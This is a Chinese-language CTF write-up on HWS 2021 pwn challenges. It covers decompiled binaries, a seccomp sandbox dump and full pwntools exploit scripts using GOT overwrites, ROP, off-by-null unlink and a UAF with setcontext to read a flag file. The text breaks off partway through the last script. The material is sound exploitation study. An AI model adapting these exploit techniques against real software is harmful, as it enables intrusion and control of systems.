<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>主逻辑如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v7[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_400B06();</span><br><span class="line">  sub_400B8E();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;your code:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    v7[i] = atoi(s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = v7[j];</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        choice_2();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        choice_1();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在一个函数里用scanf给了个任意地址写</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">choice_2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">120</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;id:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;info:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">108uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;no check&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而这个地址的值可以由另一个函数栈帧复用控制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">choice_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x90</span>uLL);</span><br><span class="line">  Chunk = (__int64)strdup(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;check it : %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)Chunk);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数里第一个小点是其用的strdup，所以可以把栈上的libc dup进堆里从而在接下来的printf中泄露，第二个小点是这个函数里的溢出长度是可以覆盖Canary的</p>
<p>所以整体的思路就是用任意地址写去改exit的got表为main，实现无限循环，然后泄露libc，最后把<code>__stack_chk_fail</code>函数的got表改成<code>pop xxx; ret</code>，从而执行栈上的ROP即可</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./justcode&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./justcode&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p_addr</span>(<span class="params">addr</span>):</span></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span> + addr</span><br><span class="line">	p.sendafter(<span class="string">&quot;name:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;id:&quot;</span>, content)</span><br><span class="line">	p.sendafter(<span class="string">&quot;info:&quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change exit_got</span></span><br><span class="line">main = <span class="number">0x400D4B</span></span><br><span class="line">code = <span class="string">b&#x27;1\n2\n3\n3\n&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;your code:\n&quot;</span>,code)</span><br><span class="line">p_addr(p64(elf.got[<span class="string">&#x27;exit&#x27;</span>]))</span><br><span class="line">write(<span class="string">b&#x27;4197707&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write &#x27;flag&#x27; to bss</span></span><br><span class="line">bss = <span class="number">0x6020A0</span> + <span class="number">0x200</span></span><br><span class="line">code = <span class="string">b&#x27;1\n2\n3\n3\n&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;your code:\n&quot;</span>,code)</span><br><span class="line">p_addr(p64(bss))</span><br><span class="line"></span><br><span class="line">write(<span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;0x67616c66&quot;</span>,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc and orw</span></span><br><span class="line">code = <span class="string">b&#x27;1\n1\n2\n1\n&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;your code:\n&quot;</span>,code)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name:\n&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f28a354361e</span> - <span class="number">0x7f28a34c8000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line">pop_rdi = <span class="number">0x400EA3</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x00000000000202f8</span></span><br><span class="line"></span><br><span class="line">p_addr(p64(elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]))</span><br><span class="line">write(<span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;0x400EA3&quot;</span>,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400C7F\nb *0x400D00\nb *0x400C8E\n&#x27;)</span></span><br><span class="line">payload = p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(ope)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read)</span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(puts)</span><br><span class="line">payload = payload.ljust(<span class="number">0x90</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="undlcv"><a href="#undlcv" class="headerlink" title="undlcv"></a>undlcv</h2><p>2.23的off by null，有点久远了都快忘了怎么打了，经典没开PIE和能改got表，触发unlink之后改堆指针，然后改got表为one_gadget</p>
<p>这道题因为是没有输出函数的，所以最简单的办法应该是爆破one_gadget了，刚好有个函数的got表跟一个one_gadget只差0.5个字节</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;info&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.send(<span class="string">b&#x27;1&#x27;</span>.ljust(<span class="number">0xa</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	p.send(<span class="built_in">str</span>(index).ljust(<span class="number">0xa</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">	p.send(<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">0xa</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	p.send(<span class="built_in">str</span>(index).ljust(<span class="number">0xa</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	p.send(content)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.send(<span class="string">b&#x27;3&#x27;</span>.ljust(<span class="number">0xa</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	p.send(<span class="built_in">str</span>(index).ljust(<span class="number">0xa</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add0</span>():</span></span><br><span class="line">	p.send(<span class="string">b&#x27;3&#x27;</span>.ljust(<span class="number">0xa</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">Heap = <span class="number">0x403480</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">	add(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	fake = p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>)</span><br><span class="line">	fake += p64(Heap - <span class="number">0x18</span>) + p64(Heap - <span class="number">0x10</span>)</span><br><span class="line">	fake = fake.ljust(<span class="number">0xf0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">	fake += p64(<span class="number">0xf0</span>)</span><br><span class="line">	edit(<span class="number">0</span>,fake)</span><br><span class="line"></span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x403430</span>) + p64(Heap)</span><br><span class="line">	edit(<span class="number">0</span>, payload)</span><br><span class="line">	<span class="comment">#gdb.attach(p,&#x27;b *0x40123D&#x27;)</span></span><br><span class="line">	edit(<span class="number">0</span>, <span class="string">b&#x27;\x47\x32&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = process(<span class="string">&quot;./undlcv&quot;</span>)</span><br><span class="line">		p.timeout = <span class="number">0.1</span></span><br><span class="line">		pwn()</span><br><span class="line">		p.sendline(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">		sleep(<span class="number">0.1</span>)</span><br><span class="line">		a = p.recv()</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">			<span class="built_in">print</span>(a)</span><br><span class="line">			p.interactive()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br></pre></td></tr></table></figure>

<h2 id="vtcpp"><a href="#vtcpp" class="headerlink" title="vtcpp"></a>vtcpp</h2><p>一道C++的2.23的堆，漏洞是UAF，总得来说还是比较简单的</p>
<p>保护如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>开了沙箱，如下，需要用openat来代替open，此外是用seccomp开的，所以堆布局是乱的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> seccomp-tools dump ./vtcpp</span> </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>主逻辑如下</p>
<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-1.jpg" class>

<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-2.jpg" class>

<p>因为C++还没学，所以很多内容不太看得懂，只能自己去调一下理解一下（<del>有人大二了连C++都不会，令人感叹</del>）</p>
<p>add主要的逻辑在<code>sub_401AD0((__int64)chunk, (__int64)v14, age);</code>函数里，总得来说最后的chunk结构如下</p>
<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-3.jpg" class>

<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-4.jpg" class>

<p>chunk+0处存的是个函数指针的指针，会用chunk+0x10处的指针输出内容，输出长度在chunk+0x18处记录，这个函数指针会在show时被调用</p>
<p>delete处是个UAF，而且可以在case 4处把这个chunk重新拿出来改内容，改掉输出的指针以此泄露libc和堆，最后orw没想到很好的方法，所以用的是setcontext，但是程序add申请出来的堆块只有0x40的大小，是肯定不够setcontext的构造的，所以需要拿到跟这个chunk高位相邻的那个chunk，在本地观察时可以发现这个相邻的chunk恰好在unsorted bin处，所以可以用case 4直接拿出来构造setcontext的内容</p>
<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-5.jpg" class>

<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-6.jpg" class>

<p>在本地这样打是没问题的，但是不太清楚打远程这样能不能行得通，不过感觉堆布局应该都是一样的，所以应该可以吧</p>
<p>一个大师傅的方法是正好找到了一些些些些gadget能用栈上的数据栈迁移：<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/02/01/hws/">HWS 2021 入营赛 Pwn/固件/内核 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
<p>此外，<code>openat</code>跟<code>open</code>有些不一样，其函数原型如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openat</span><span class="params">(<span class="keyword">int</span> dirfd, <span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openat</span><span class="params">(<span class="keyword">int</span> dirfd, <span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags, <span class="keyword">mode_t</span> mode)</span></span>;</span><br></pre></td></tr></table></figure>

<p>openat函数是用来在指定的文件描述符所表示的目录中打开或者创建文件的，所以第一个参数应该是个目录的文件描述符，如果pathname是相对路径的话就会用到这个目录的文件描述符，但如果是绝对路径的话就不需要，例如上面贴的师傅的exp打开的就是<code>/flag</code>，所以第一个参数就随意。如果想操作当前工作目录的话（比如flag一般就在跟程序一样的目录中），就要设置成<code>at_fdcwd</code>（对应值是-100）。</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./vtcpp&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name, age, msg</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;name: &quot;</span>, name)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;age: &quot;</span>, age)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;message: &quot;</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">note</span>(<span class="params">size, content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line">func_ptr = <span class="number">0x401D98</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;222&#x27;</span>, <span class="string">b&#x27;333&#x27;</span>)</span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">free()</span><br><span class="line">payload = p64(func_ptr) + p64(<span class="number">0</span>) + p64(<span class="number">0x602F68</span>) + p64(<span class="number">8</span>)</span><br><span class="line">note(<span class="number">0x38</span>,payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;name :&quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7fd84b8f6750</span> - <span class="number">0x7fd84b8d6000</span>)</span><br><span class="line">ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = <span class="number">0x401350</span></span><br><span class="line">puts = <span class="number">0x401310</span></span><br><span class="line">pop_rdi = <span class="number">0x401CA3</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x00000000000202f8</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x000000000003a738</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000bc3f5</span></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">ret = <span class="number">0x401CA4</span></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">free()</span><br><span class="line">payload = p64(func_ptr) + p64(<span class="number">0</span>) + p64(<span class="number">0x603340</span>) + p64(<span class="number">8</span>)</span><br><span class="line">note(<span class="number">0x38</span>,payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;name :&quot;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># orw</span></span><br><span class="line">free()</span><br><span class="line">payload = p64(heap + <span class="number">8</span>) + p64(setcontext)</span><br><span class="line">note(<span class="number">0x38</span>,payload)</span><br><span class="line">payload = p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(heap+<span class="number">0x70</span>) + p64(pop_rdx) + p64(<span class="number">0x300</span>) + p64(read)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>,<span 